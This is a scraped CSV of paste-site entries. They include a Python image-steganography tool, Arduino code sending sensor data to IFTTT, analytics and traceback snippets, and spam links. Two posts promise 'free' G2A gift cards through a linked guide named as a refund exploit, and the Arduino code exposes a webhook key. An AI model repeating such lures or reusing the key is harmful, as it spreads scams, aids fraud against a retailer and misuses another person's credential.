id,title,username,language,date,content
r3byQqxT,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Friday 8th of March 2024 06:04:53 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_270922.pdf

Working as of:
08 March 2024"
P6GnFdut,data863,TestGuy1,JSON,Friday 8th of March 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '14546f7f031b815e286565bc38e77f83a43c3021b18e661a2958835c1cd706635953c0a13ca098184f4f0a4aa8c93b0777eeac96603f11bff0788bd946c0f951642e09bfc6b963d1eb2ecb11fc3e6851af40482f6ed7bba00a5e490ace7dfa56767e489bffb39ba40c1d5ff74e1f7372be666420864c5be560f4ea9b5f5f1880',
  otherdata: [
    'b5f03a2fc3562f0032e3766e83747e22',
    '2401ab5b577366fdd2cfe2693cda2ede',
    '31d24e7f997cf026298a861caba18775',
    '40d52c1334409ad01744e453cec11701',
    '49d344a2a9d8dc10aea9e2061ed5da55',
    '2f970c3cc9708ba34e1e98427ef112e4',
    '1683382b0211b4c1e628c2da6e942174',
    'eaf0d0eeeaee2049c22f02d2f492def0'
  ]
}"
ve039A0q,STEGANO-VIWE-IMAGE2.py,Najeebsk,Python,Friday 8th of March 2024 06:00:05 AM CDT,"import os
import numpy as np
from imageio.v2 import imread, imwrite
import tkinter as tk
from PIL import Image, ImageTk
import subprocess

max_value = 255  # max uint value per pixel per channel
header_len = 4 * 8  # uint32 bit length

def read_image(img_path):
    img = np.array(imread(img_path), dtype=np.uint8)
    orig_shape = img.shape
    return img.flatten(), orig_shape

def write_image(img_path, img_data, shape):
    img_data = np.reshape(img_data, shape)
    imwrite(img_path, img_data)

def bytes2array(byte_data):
    byte_array = np.frombuffer(byte_data, dtype=np.uint8)
    return np.unpackbits(byte_array)

def array2bytes(bit_array):
    byte_array = np.packbits(bit_array)
    return byte_array.tobytes()

def read_file(file_path):
    file_bytes = open(file_path, ""rb"").read()
    return bytes2array(file_bytes)

def write_file(file_path, file_bit_array):
    bytes_data = array2bytes(file_bit_array)
    with open(file_path, 'wb') as f:
        f.write(bytes_data)

def encode_data(image, file_data):
    or_mask = file_data
    and_mask = np.zeros_like(or_mask)
    and_mask = (and_mask + max_value - 1) + or_mask 
    res = np.bitwise_or(image, or_mask)
    res = np.bitwise_and(res, and_mask)
    return res

def decode_data(encoded_data):
    out_mask = np.ones_like(encoded_data)
    output = np.bitwise_and(encoded_data, out_mask)
    return output

def hide_images():
    original_file = original_entry_hide.get()
    hide_file = hide_entry_hide.get()
    save_file = save_entry_hide.get()
    img_path = f'DEEPFAKE/{original_file}.jpg'
    file_path = f'DEEPFAKE/{hide_file}.jpg'
    output_path = f'DATA/{save_file}.png'

    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return
    if not os.path.isfile(file_path):
        print(""File does not exist"")
        return

    image, shape_orig = read_image(img_path)
    file = read_file(file_path)
    file_len = file.shape[0]
    len_array = np.array([file_len], dtype=np.uint32).view(np.uint8)
    len_array = np.unpackbits(len_array)
    img_len = image.shape[0]

    if file_len >= img_len - header_len:
        print(""File too big, error"")
        return
    else:
        tmp = file
        file = np.random.randint(2, size=img_len, dtype=np.uint8)
        file[header_len:header_len+file_len] = tmp

    file[:header_len] = len_array
    encoded_data = encode_data(image, file)

    write_image(output_path, encoded_data, shape_orig)
    print(""Image encoded"")

    preview_img = Image.fromarray(encoded_data.reshape(shape_orig))
    photo = ImageTk.PhotoImage(preview_img)
    lbl.config(image=photo)
    lbl.image = photo

def unhide_images():
    original_file = original_entry_unhide.get()
    save_file = save_entry_unhide.get()
    img_path = f'DATA/{original_file}.png'
    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return

    encoded_data, shape_orig = read_image(img_path)
    data = decode_data(encoded_data)
    el_array = np.packbits(data[:header_len])
    extracted_len = el_array.view(np.uint32)[0]
    data = data[header_len:extracted_len+header_len]
    write_file(f'DATA/{save_file}.jpg', data)
    print(""Image decoded and saved"")

    # Load and display the original PNG image in frame 1
    original_image_path = f'DATA/{original_file}.png'
    original_image = Image.open(original_image_path)
   # original_image.thumbnail((shape_orig[0] // 3, shape_orig[1]))  # Resize if needed
    original_photo = ImageTk.PhotoImage(original_image)
    lbl.config(image=original_photo)
    lbl.image = original_photo

    saved_image_path = f'DATA/{save_file}.jpg'
    #subprocess.Popen(['start', saved_image_path], shell=True)

    # Load the saved image for display in Frame2
    saved_image = Image.open(saved_image_path)
    #saved_image.thumbnail((shape_orig[0] // 3, shape_orig[1]))  # Resize if needed
    saved_photo = ImageTk.PhotoImage(saved_image)
    lbl2.config(image=saved_photo)
    lbl2.image = saved_photo

root = tk.Tk()
root.geometry(""1000x660"")
root.title(""Hide and Unhide Images"")

# Frame for Original Image
f = tk.Frame(root, bd=3, bg=""#2c3e50"", width=500, height=630, relief=tk.GROOVE)
f.place(x=5, y=10)

tk.Label(f, text=""Open Original Image:"").place(x=10, y=10)
original_entry_hide = tk.Entry(f)
original_entry_hide.place(x=150, y=10)

tk.Label(f, text=""Open Image to Hide:"").place(x=10, y=40)
hide_entry_hide = tk.Entry(f)
hide_entry_hide.place(x=150, y=40)

tk.Label(f, text=""Save Hidden Image:"").place(x=10, y=70)
save_entry_hide = tk.Entry(f)
save_entry_hide.place(x=150, y=70)

hide_button = tk.Button(f, text=""Hide"", command=hide_images)
hide_button.place(x=150, y=100)

lbl = tk.Label(f, bg=""#2c3e50"")
lbl.place(x=10, y=140)

# Frame for Unhidden Image
frame2 = tk.Frame(root, bd=3, width=500, height=630, relief=tk.GROOVE, bg=""#34495e"")
frame2.place(x=505, y=10)

tk.Label(frame2, text=""Open Encoded Image:"").place(x=10, y=10)
original_entry_unhide = tk.Entry(frame2)
original_entry_unhide.place(x=150, y=10)

tk.Label(frame2, text=""Save Unhidden Image:"").place(x=10, y=40)
save_entry_unhide = tk.Entry(frame2)
save_entry_unhide.place(x=150, y=40)

unhide_button = tk.Button(frame2, text=""Unhide"", command=unhide_images)
unhide_button.place(x=150, y=70)

lbl2 = tk.Label(frame2, bg=""#34495e"")
lbl2.place(x=10, y=100)

root.mainloop()
"
e8EY0bGr,omnihypnosis.com - purchase,chiragsolanki,JavaScript,Friday 8th of March 2024 05:47:09 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'GA4_purchase',            // name of the event. In this case, it always must be GA4_purchase
  ecommerce: {
    currency: 'CHF',
    value: 575.00,                       // order total
    tax: 00.00,                          // If tax available 
    transaction_id: 'abc123',           // transaction id
    coupon: 'coupon code',          // if coupon was applied to the order, include it here          
    items: [{                           // an array with all products
      item_name: 'OMNI Hypnotiseur Zertifizierung online',           // insert an actual product name
      item_id: 'product1',              // insert an actual product ID
      price: 575.00,                 // insert an actual product price
      quantity: '1',                    // product quantity
    }]
  }
});"
rs4GGJQg,ServerDisconnectedError: Server disconnected,basedcount_bot,Python,Friday 8th of March 2024 05:19:52 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 45, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 227, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 63, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1187, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 601, in _request
    await resp.start(conn)
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client_reqrep.py"", line 965, in start
    message, payload = await protocol.read()  # type: ignore[union-attr]
                       ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/streams.py"", line 622, in read
    await self._waiter
aiohttp.client_exceptions.ServerDisconnectedError: Server disconnected
"
gp1KZpXL,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Friday 8th of March 2024 04:57:16 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1QX2f9c6IIh85U8kry1bxwlS9OdjQFGFZ/view?usp=sharing
or
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
08 March 2024"
kSezH9zr,Soccer Prediction Betting Tips 08032024,livebetpro,PHP,Friday 8th of March 2024 04:54:22 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-08032024/
ME8hcAYc,Untitled,sissou123,C,Friday 8th of March 2024 04:53:02 AM CDT,"C Programming Bootcamp - The Complete C Language Course
C Programming 2024: Master the Fundamentals of C Programming Language. Join the Comprehensive C Bootcamp Masterclass! 
What you'll learn
Fundamentals of Programming
Summarised & Concise Material [Saving TONS of Time!]  
for more:https://urlis.net/h7r5w75y

"
r23enTM1,Untitled,sissou123,C,Friday 8th of March 2024 04:48:52 AM CDT,"C Programming Masterclass: Pointers & Advanced C Language
C Programming Advanced Topics: Pointers, Memory, Low-Level C Language and Embedded C Preparation 
What you'll learn
Introduction To Pointers For Beginners
Pointers Declaration, Initialization, and Usage 
for more:https://urlis.net/wx7eywhj
"
EUfGRkgf,Drone Project #3,zhexo,Arduino,Friday 8th of March 2024 04:31:32 AM CDT,"#include <SoftwareSerial.h>
#include <String.h>
#include <Wire.h>
//BMP180 basınç sensörü kütüphanesini ekleyiniz
#include <SFE_BMP180.h>

//bmp180 sensör nesnesini oluşturunuz
SFE_BMP180 bmp180;  
 
SoftwareSerial gprsSerial(8,7); //RX, TX

//Webhook Key Bilgisi
String KEY=""dJBRnRYfGMSFa4JVDNthUD"";

//Webhook Event Name Bilgisi
String EVENT_NAME=""olcum"";

//Bu fonksiyon ile gprs haberleşmesini Serial monitöre yazdırarak debug ediyoruz.
void ShowSerialData()
{
  while(gprsSerial.available()!=0)
    Serial.write(gprsSerial.read());
  delay(5000); 
}

void setup()
{
  //GPRS shield baud hızını ayarlıyoruz.
  gprsSerial.begin(9600); 

  Serial.begin(9600);   
  bool baslatildiMi = bmp180.begin();
  if (baslatildiMi) {
    Serial.println(""BMP180 baslatildi."");
  }
  delay(500);

  //Gönderdiğimiz komutların sorunsuzca ulaşıp ulaşmadığını test ediyoruz
  gprsSerial.println(""AT"");
  delay(1000);
 
  //Sim kart pin durumunu sorguluyoruz
  gprsSerial.println(""AT+CPIN?"");
  delay(1000);
 
  //Şebeke kontrolünü yapıyoruz
  gprsSerial.println(""AT+CREG?"");
  delay(1000);
 
  //GPRS bağlantısını kontrol ediyoruz
  gprsSerial.println(""AT+CGATT?"");
  delay(1000);
 
  //Varsa IP oturumunu sıfırlıyoruz
  gprsSerial.println(""AT+CIPSHUT"");
  delay(1000);
 
  gprsSerial.println(""AT+CIPSTATUS"");
  delay(2000);
 
  //Tekli bağlantı kuruyoruz
  gprsSerial.println(""AT+CIPMUX=0"");
  delay(2000);
  ShowSerialData();
 
  //APN ayarlarını yapıyoruz
  gprsSerial.println(""AT+CSTT=\""internet\"""");
  delay(1000);
  ShowSerialData();
 
  //Kablosuz bağlantıyı açıyoruz
  gprsSerial.println(""AT+CIICR"");
  delay(3000);
  ShowSerialData();
 
  //Bağlantı sağlandığında yerel IP adresini alıyoruz
  gprsSerial.println(""AT+CIFSR"");
  delay(2000);
  ShowSerialData();
 
  gprsSerial.println(""AT+CIPSPRT=0"");
  delay(3000);
  ShowSerialData();
}
 
void loop()
{ 
  //BMP180 sensöründen okunan durumu tutacak değişkeni tanımlıyoruz
  char durum;
  //Sıcaklık ve basınç değişkenlerini tanımlıyoruz
  double sicaklik=0;  
  double basinc=0;
    
  //IFTTT domain adına TCP bağlantısını başlatıyoruz
  gprsSerial.println(""AT+CIPSTART=\""TCP\"",\""maker.ifttt.com\"",\""80\"""");
  delay(6000);
  ShowSerialData();
 
  //Uzak sunucuya veri gönderiyoruz
  gprsSerial.println(""AT+CIPSEND"");
  delay(4000);
  ShowSerialData();

  //BMP180 sensörü ile basınç ve sıcaklık ölçümü yapıyoruz
  durum = bmp180.startTemperature();

  if (durum != 0) {
    delay(1000);
    durum = bmp180.getTemperature(sicaklik);

    if (durum != 0) {
      durum = bmp180.startPressure(3);

      if (durum != 0) {
        delay(durum);
        durum = bmp180.getPressure(basinc, sicaklik);

        if (durum != 0) {
          Serial.print(""Basınç: "");
          Serial.print(basinc);
          Serial.println("" hPa"");

          Serial.print(""Sıcaklık: "");
          Serial.print(sicaklik);
          Serial.println("" C"");
        }
      }
    }
  }
  
  //IFTTT'ye GET isteğinde bulunuyoruz
  String istek=""GET https://maker.ifttt.com/trigger/""+EVENT_NAME+""/with/key/""+KEY+""?value1=""+String(sicaklik)+""C&value2=""+String(basinc)+""hPa"";
  Serial.println(istek);
  //Uzak sunucuya veriyi göndermek için istekde bulunuyoruz
  gprsSerial.println(istek);
  delay(4000);
  ShowSerialData();
 
  //Ctrl+Z ile verinin gönderimini sağlıyoruz
  //Cevap bekliyoruz, Zaman internetin durumuna bağlıdır.
  gprsSerial.println((char)26);
  delay(5000);
  gprsSerial.println();
  ShowSerialData();
 
  //Bağlantıyı kapatıyoruz
  gprsSerial.println(""AT+CIPSHUT"");
  delay(100);
  ShowSerialData();
}
 "
